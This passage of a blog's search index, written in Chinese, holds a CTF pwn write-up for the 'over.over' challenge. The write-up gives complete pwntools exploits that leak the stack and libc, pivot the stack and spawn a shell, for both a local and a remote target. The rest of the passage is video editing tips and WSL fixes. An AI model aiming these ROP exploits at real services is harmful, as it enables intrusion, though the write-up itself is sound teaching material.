class="line">+---------------------+</span><br><span class="line">| ...                 | 高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| next_retaddr        |</span><br><span class="line">+---------------------+</span><br><span class="line">| arg2                |</span><br><span class="line">+---------------------+</span><br><span class="line">| arg1                |</span><br><span class="line">+---------------------+</span><br><span class="line">| pop_xxx_pop_xxx_ret |</span><br><span class="line">+---------------------+</span><br><span class="line">| target function addr|</span><br><span class="line">+---------------------+</span><br><span class="line">| ebp2                | </span><br><span class="line">+---------------------+ &lt;- ebp2_addr</span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="2018-安恒杯-over-over"><a href="#2018-安恒杯-over-over" class="headerlink" title="2018 安恒杯 over.over"></a>2018 安恒杯 over.over</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped</span><br><span class="line">[*] &#x27;/home/m4x/pwn_repo/others_over/over.over&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( sub_400676() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400676</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">96uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个题的思路是泄露libc执行execve，但可以看出read读96字节但buf长度已经有80字节，所以只能通过覆盖saved rbp和retaddr来劫持<code>RBP</code><br>我们向buf上写入rop链，然后劫持<code>RSP</code>和<code>RBP</code>到此处，这就需要我们知道buf的地址</p>
+<h5 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak stack"></a>leak stack</h5><p>我们使用<code>puts</code>函数泄露出saved rbp，然后就能根据saved rbp的值推算出栈上各个数据的地址</p>
+<p>我们leak的时候靠的是运行<code>sub_400676()</code>这个函数中的puts函数，而传给puts的参数是位于<code>sub_400676</code>栈上的<code>buf</code>，<code>buf</code>挨着的是<code>sub_400676</code>栈上的saved rbp，而这个saved rbp是主调函数的，也就是<code>main</code>函数的<code>RBP</code>。我们需要计算<code>main</code>函数的<code>RBP</code>地址到<code>buf</code>的长度，<code>main</code>函数的<code>RBP</code>减去长度值即得到<code>buf</code>的地址。</p>
+<p>一种简单的计算方法是调试，在<code>main</code>函数下断点看看<code>RBP</code>的值，然后运行到<code>sub_400676</code>看看<code>buf</code>的地址，直接一减就出来了。</p>
+<p>另一种方法是看汇编，<code>main</code>函数中:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006C1                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006C4                 sub     rsp, 10h</span><br></pre></td></tr></table></figure></div>
+
+<p>这使<code>RBP</code>的值固定，<code>RSP</code>减0x10，也就是说<code>main</code>函数中<code>RSP</code>到<code>RBP</code>距离为0x10</p>
+<p>随后运行到<code>call sub_400676()</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400676                 push    rbp</span><br><span class="line">.text:0000000000400677                 mov     rbp, rsp</span><br><span class="line">.text:000000000040067A                 sub     rsp, 50h</span><br></pre></td></tr></table></figure></div>
+
+<p>这使得<code>RSP</code>向下移动了0x8+0x8+0x50&#x3D;0x60。其中第一个0x8是<code>call</code>指令把返回地址压栈造成的</p>
+<p>所以<code>RSP</code>到最初<code>main</code>函数<code>RBP</code>的距离是0x10+0x60&#x3D;0x70</p>
+<p>当我们泄露出<code>main</code>函数的<code>RBP</code>，我们对其减0x70，就能得到<code>buf</code>的地址了</p>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>本地打：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;for debug</span></span><br><span class="line"><span class="string">def DEBUG(cmd):</span></span><br><span class="line"><span class="string">    raw_input(&quot;DEBUG: &quot;)</span></span><br><span class="line"><span class="string">    gdb.attach(io, cmd)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = elf.libc <span class="comment"># 本地打，可以直接获取libc</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line"><span class="comment"># 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车&quot;\x0a&quot;会被作为数据录入，直接影响到saved rbp</span></span><br><span class="line"></span><br><span class="line">buf = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="comment"># 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到&quot;\0&quot;才会停</span></span><br><span class="line"><span class="comment"># 我们用0x80个a把栈空间填满，于是puts就会一直打印直到遇到&quot;\0&quot;</span></span><br><span class="line"><span class="comment"># 而后面就是8字节的saved rbp，会被puts泄露出来</span></span><br><span class="line"><span class="comment"># 栈是由高地址向低地址生长，其最高字节一定是&quot;\x7f&quot;</span></span><br><span class="line"><span class="comment"># 根据小端序&quot;高高低低&quot;，&quot;\x7f&quot;在高地址也就是泄露出来的8字节的最后一个字节，故recvuntil(b&quot;\x7f&quot;)</span></span><br><span class="line"><span class="comment"># 至于这里为什么切最后6个字节，原因是x64规定内存地址不能大于 0x00007FFFFFFFFFFF</span></span><br><span class="line"><span class="comment"># 6个字节长度，否则会抛出异常。所以栈地址一定保存在最后6字节中</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line"><span class="comment">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;11111111&#x27;</span>, pop_rdi_ret, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">b&#x27;1&#x27;</span>, buf, leave_ret])</span><br><span class="line"><span class="comment"># 这个payload先倒着看，依次对应的是retaddr和saved rbp</span></span><br><span class="line"><span class="comment"># 首先pop rbp使rbp指向buf，也就是payload写进栈中的&quot;11111111&quot;那个位置</span></span><br><span class="line"><span class="comment"># 然后ret到leave_ret，执行leave使rsp也指向buf，随后pop rbp把&quot;11111111&quot;弹出，rsp指向pop_rdi_ret</span></span><br><span class="line"><span class="comment"># ret到pop_rdi_ret，把puts的got表载入rdi，再ret调用puts来泄露got表得到偏移量</span></span><br><span class="line"><span class="comment"># puts再ret回到sub_400676了</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这一步是实际地址减去偏移量得到libc基址</span></span><br><span class="line"><span class="string">libc被加载到内存中的动态链接区域，这个区域在栈的下方，所以这里也使用&quot;\x7f&quot;作为结束符接受</span></span><br><span class="line"><span class="string">对应的，对于32位程序，需要使用&quot;\xf7&quot;</span></span><br><span class="line"><span class="string">u32(r.recvuntil(&#x27;\xf7&#x27;)[-4:])</span></span><br><span class="line"><span class="string">+-------------------+  &lt;--- 高地址</span></span><br><span class="line"><span class="string">|       栈区        |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|   动态链接区域    |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       堆区        |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       数据区      |</span></span><br><span class="line"><span class="string">|  (data + bss)     |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       代码区      |</span></span><br><span class="line"><span class="string">+-------------------+  &lt;--- 低地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;每台机子不一样</span></span><br><span class="line"><span class="string">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep -E &quot;rsi|rdx&quot;</span></span><br><span class="line"><span class="string">0x0000000000090528 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000011f497 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x0000000000090529 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000002a743 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000002a3e3 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rsi_ret=libc.address+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc.address+<span class="number">0x90529</span></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/bin/sh &quot;</span>,<span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve&quot;</span>, <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;execve&#x27;</span>]))</span><br><span class="line">payload=flat([<span class="string">b&#x27;22222222&#x27;</span>, pop_rdi_ret, <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)),pop_rsi_ret,p64(<span class="number">0</span>),pop_rdx_rbx_ret,p64(<span class="number">0</span>),p64(<span class="number">0xdeadbeef</span>), libc.sym[<span class="string">&#x27;execve&#x27;</span>], (<span class="number">80</span> - <span class="number">9</span>*<span class="number">8</span> ) * <span class="string">b&#x27;2&#x27;</span>, buf - <span class="number">0x30</span>, <span class="number">0x4006be</span>])</span><br><span class="line"><span class="comment"># 此payload和之前的类似，但不同之处是最后是buf - 0x30</span></span><br><span class="line"><span class="comment"># 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置</span></span><br><span class="line"><span class="comment"># 执行完puts到最后程序ret又回到了sub_400676</span></span><br><span class="line"><span class="comment"># [b&#x27;11111111&#x27;, pop_rdi_ret, elf.got[&#x27;puts&#x27;], elf.plt[&#x27;puts&#x27;], 0x400676, (80 - 40) * b&#x27;1&#x27;, buf, leave_ret]</span></span><br><span class="line"><span class="comment"># 回想当我们正常进入sub_400676时push rbp之前，rsp指向的是payload中的leave_ret</span></span><br><span class="line"><span class="comment"># 而我们上一次通过ret进入sub_400676时push rbp之前，rsp指向payload中的0x400676的末尾</span></span><br><span class="line"><span class="comment"># 这两次rsp相差 (80 - 40) * &#x27;1&#x27;+ buf两段数据长0x30，也就是说rsp向下移动了0x30</span></span><br><span class="line"><span class="comment"># 所以第二次payload的&quot;22222222&quot;的填入地址减小了0x30</span></span><br><span class="line"><span class="comment"># 如果想不通就用gdb调试下，直接下断点看rsp值</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>远程打：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./over.over&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;114.51.41.9&quot;</span>, <span class="number">11451</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line">buf = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;11111111&#x27;</span>, pop_rdi_ret, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">b&#x27;1&#x27;</span>, buf, leave_ret])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="comment">#bin_sh = libc.dump(&quot;str_bin_sh&quot;) + base</span></span><br><span class="line">system = libc.dump(<span class="string">&quot;system&quot;</span>) + base</span><br><span class="line"><span class="comment"># 远程打用execve要三个参数，有时找gadgets得用libc，就得去下载相应的libc，所以能用system就用system</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">❯ ROPgadget --binary over.over --only &quot;ret&quot;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400509 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ret = <span class="number">0x400509</span> <span class="comment"># 栈对齐</span></span><br><span class="line">payload=flat([<span class="string">b&#x27;/bin/sh\0&#x27;</span>, pop_rdi_ret, p64(buf-<span class="number">0x30</span>), ret, system, (<span class="number">80</span> - <span class="number">8</span>*<span class="number">5</span>)*<span class="string">b&quot;a&quot;</span>, buf - <span class="number">0x30</span>, leave_ret])</span><br><span class="line"><span class="comment"># 把字符串存栈里调用也可以</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="待添加"><a href="#待添加" class="headerlink" title="待添加"></a>待添加</h3>]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>视频小技巧</title>
+    <url>/2022/12/20/video-tips/</url>
+    <content><![CDATA[<p>最近不得不制作一些视频，所以趁此机会写一些视频方面的花招</p>
+<p>本文中使用的视频编辑器为Vegas</p>
+<h3 id="帧数处理"><a href="#帧数处理" class="headerlink" title="帧数处理"></a>帧数处理</h3><p>Vegas渲染时可以调整帧数和比特率，对于我的视频，这两样不需要太高。</p>
+<p>在渲染时，建议采用720P、12fps</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/xrrj.jpg"
+                      alt="渲染"
+                ></p>
+<p>为何要将帧数调低？因为帧数低更容易去掉视频中的不和谐感</p>
+<p>另外，在生成低帧数视频后，可以使用各种工具插帧，生成高帧数视频</p>
+<p>比如ffmpeg自带的光流算法插帧，但此方式不适合现实事物等画面高速移动的视频</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i in.mp4 -filter_complex &quot;minterpolate=&#x27;fps=30&#x27;&quot; out.mp4</span><br></pre></td></tr></table></figure></div>
+
+<p>现在有很多AI插帧，效果都是比较好的</p>
+<h3 id="模拟对焦"><a href="#模拟对焦" class="headerlink" title="模拟对焦"></a>模拟对焦</h3><p>早些时候的手机，录视频时会时不时出现模糊，那是在对焦。我们可以模拟对焦，并利用模糊来去除视频中的不和谐感。</p>
+<p>要注意的是，既然决定使用这种方式，那整个视频中必须出现多次对焦画面，不然那一次对焦会显得很突兀。</p>
+<p>Vegas中的散焦特效：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fx_sj.jpg"
+                      alt="散焦"
+                ></p>
+<p>为画面加上这个FX，就能模拟对焦了。配置中有时钟样式的按钮，点击就能按时间轴来配置各个时候的焦点参数。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fx_sj_config.jpg"
+                      alt="config"
+                ></p>
+<p>早期手机的对焦方式是被动对焦，也就是根据镜头的成像来判断是否对准，所以在对焦时，往往会越过焦点后才能确认到焦点。</p>
+<p>模拟的时候也要模拟这个行为：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fx_sj_wave.jpg"
+                     
+                ></p>
+<p>如上图，在配置页面的右下脚选择曲线就能这样配置了。模拟对焦并不存在空间的概念，所以数值只有正没有负。</p>
+<h3 id="平移和裁剪"><a href="#平移和裁剪" class="headerlink" title="平移和裁剪"></a>平移和裁剪</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/pkyi_cdjm.jpg"
+                     
+                ></p>
+<p>如图为Vegas的平移裁剪功能，是非常简陋的，但配合散焦特效也能消除不和谐感。其中的蒙板功能在平时编辑时也是非常有用的，可以去掉素材中的某个部分，或只显示某个部分。</p>
+<p>暂时只写这些。最近事情多，但天天宅家里到现在还没阳。我好怕过年的时候阳了，那得难受死。</p>
+<h3 id="Virtual-Camera"><a href="#Virtual-Camera" class="headerlink" title="Virtual Camera"></a>Virtual Camera</h3><p>更新于2022&#x2F;12&#x2F;22</p>
+<p>有时我们需要虚拟摄像头，将视频文件推流出去。</p>
+<p>要在一些会议类软件使用虚拟摄像头，可以使用OBS，具体使用方法网上有很详细的教程。</p>
+<p>要在Chrome中将摄像头内容替换为视频文件，只需要添加启动参数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome.exe --use-fake-device-for-media-stream --use-file-for-fake-video-capture=&quot;path2VideoFile&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>此处的视频文件不能使用常见的mp4文件，而要使用yuv420p编码形式的视频文件。我们可以使用ffmpeg将普通mp4视频转为该类文件：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffmpeg -i inputFile.mp4 -an -pix_fmt yuv420p outputFile.y4m</span></span><br></pre></td></tr></table></figure></div>
+
+<p>视频将会循环推流，如何消除视频重新播放时的不和谐感呢？</p>
+<p>首先录制视频时，内容要减少移动，这样会比较容易实现拼接，且对倒放法比较友好，下面介绍一下倒放法</p>
+<p>倒放法，也就是将视频倒着放。在Vegas中，可以一键将视频倒放：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fjvr.jpg"
+                      alt="反转"
+                ></p>
+<p>右键素材，选择反转，素材就变成倒放了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/fjvr_1.jpg"
+                      alt="反转"
+                ></p>
+<p>像上图这样，左侧正放，右侧倒放，中间交叉连接，视频就能比较自然地拼在一起，而且连接后的视频，头尾是一致的，重新播放的时候大大降低不和谐感</p>
+<p>就写这些。最近每天只能待家里，感觉快疯了，唉</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>视频</tag>
+        <tag>技巧</tag>
+        <tag>剪辑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WSL疑难杂症记录</title>
+    <url>/2023/04/05/wsl-issues/</url>
+    <content><![CDATA[<h3 id="WSL疑难杂症"><a href="#WSL疑难杂症" class="headerlink" title="WSL疑难杂症"></a>WSL疑难杂症</h3><p>把总结写在前面：WSL 真的依托答辩，新手最好不要用，能折腾死</p>
+<p>WSL2的网络配置是雷区，非大佬者闲得没事千万不要乱调，否则搞坏了就等着重装吧</p>
+<p>我的主系统是 Windows 11，WSL 是 Ubuntu + kali(推荐)</p>
+<h3 id="wslhost-exe-调用-mstsc-exe-崩溃导致屏幕闪烁"><a href="#wslhost-exe-调用-mstsc-exe-崩溃导致屏幕闪烁" class="headerlink" title="wslhost.exe 调用 mstsc.exe 崩溃导致屏幕闪烁"></a>wslhost.exe 调用 mstsc.exe 崩溃导致屏幕闪烁</h3><p>解决方法写在最前面：</p>
+<p>win11 系统直接 <code>wsl --update</code> 升级到最新版 wsl 就行了</p>
+<p>之前用 winhex 看文件的时候发现看着看着 winhex 的界面就开始闪烁了，一秒闪一下。打开任务管理器，发现任务管理器界面也开始闪了，除了有点费眼睛之外倒是没影响其他软件使用。</p>
+<p>当时没有找到原因，直到今天闲着没事看任务管理器，突然看见 <code>mstsc.exe</code> (远程桌面连接) 这个进程出现了，这个进程一般是用户手动打开才会出现的，我寻思不会是有人在爆破我的远程桌面吧，难道是中毒了？因为之前有需求用 flash ，我就在 gitlab 上找了个纯净版的 flash 安装了，不会真有病毒吧。</p>
+<p>随后我看了下进程关系，发现居然是 <code>wslhost.exe</code> 在启动 <code>mstsc.exe</code> ，且 mstsc 的 PID 在不断变化，说明进程刚启动又退出了。随后搜索发现有微软官方仓库里有这个<a class="link"   href="https://github.com/microsoft/wslg/issues/676" >issue <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，同款问题一模一样。</p>
+<h3 id="WSL安装32位运行库"><a href="#WSL安装32位运行库" class="headerlink" title="WSL安装32位运行库"></a>WSL安装32位运行库</h3><p>某天在 WSL 里运行某 32 位单文件程序，居然提示我 No such file or dict，我思来想去哪里出了问题，但迫于时间关系最后还是尝试用Vm开虚拟机，结果可以运行该程序。</p>
+<p>既然这样那肯定就是依赖有问题，不会吧 WSL 不自带 32 位依赖吗，有点迷</p>
+<p>Ubuntu 解决方法：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libc6:i386 libncurses5:i386 libstdc++6:i386</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure></div>
+
+<p>其他系统的解决方法网上应该能搜到。</p>
+<h3 id="WSL-迁移数据"><a href="#WSL-迁移数据" class="headerlink" title="WSL 迁移数据"></a>WSL 迁移数据</h3><p>WSL 默认安装在 C 盘，可以通过 export 命令将其导出，然后重新 import 时就能设置安装位置</p>
+<p>重要提示：一定要在 unregister 前 export ，否则就会像我一样丢失当前系统里的所有数据 :)</p>
+<p>具体的操作顺序如下：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span> <span class="comment">#关闭运行中的实例</span></span><br><span class="line">wsl <span class="literal">--export</span> Ubuntu D:\wsl_export\export.tar <span class="comment">#导出为文件</span></span><br><span class="line">wsl <span class="literal">--unregister</span> Ubuntu <span class="comment">#注销系统，相当于删除卸载，数据就没有了</span></span><br><span class="line">wsl <span class="literal">--import</span> Ubuntu D:\wsl\ D:\wsl_export\export.tar <span class="literal">--version</span> <span class="number">2</span> </span><br><span class="line"><span class="comment">#第一个路径是存放WSL虚拟磁盘vhdx文件的目录，相当于安装目录</span></span><br></pre></td></tr></table></figure></div>
+
+<p>迁移完成后会发现登录用户默认变成 root 了，而最初安装系统的时候应该有提示让设置一个普通用户，所以使用此命令进行将之前的普通用户设置为默认：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">ubuntu config <span class="literal">--default-user</span> yourusername</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="WSL-Windows-网络互相访问方案"><a href="#WSL-Windows-网络互相访问方案" class="headerlink" title="WSL Windows 网络互相访问方案"></a>WSL Windows 网络互相访问方案</h3><p>WSL2使用内部VLAN进行网络连接，而且IP地址是动态的，Windows有时候想要访问WSL要去查IP，很麻烦。</p>
+<h4 id="Windows-访问-WSL"><a href="#Windows-访问-WSL" class="headerlink" title="Windows 访问 WSL"></a>Windows 访问 WSL</h4><p>多数情况下，我们的需求只有 Windows 访问 WSL 。一个可行的思路是获取 WSL 的 IP ，并写入到 Windows 的 hosts 文件中，然后就可以通过域名来访问 WSL。</p>
+<p>最简单有效的方法：</p>
+<ul>
+<li>首先在 Windows 中打开 <code>C:\Windows\System32\drivers\etc</code> 这个目录，右键属性，进入安全选项卡，在高级设置中将该文件夹的所有者改为你的账户，然后就可以对这个文件夹的权限进行更改了，我们需要将自己的账户对此文件夹的权限修改为完全控制。</li>
+<li>进入 WSL 系统，编辑 <code>~/.bashrc</code> 文件，该文件是每次运行 bash 时会运行的脚本，具体操作如下：<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim ~/.bashrc</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>在文件末尾添加如下代码：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Add wsl ip to Windows hosts</span></span><br><span class="line">line=&quot;$(ifconfig eth0 | grep &#x27;inet &#x27; | awk &#x27;&#123;print $2&#125;&#x27;) wsl.ubuntu&quot; # 生成替换内容</span><br><span class="line">sed -i &quot;s/.*wsl.ubuntu.*/$line/g&quot; /mnt/c/Windows/System32/drivers/etc/hosts # 执行替换</span><br></pre></td></tr></table></figure></div>
+
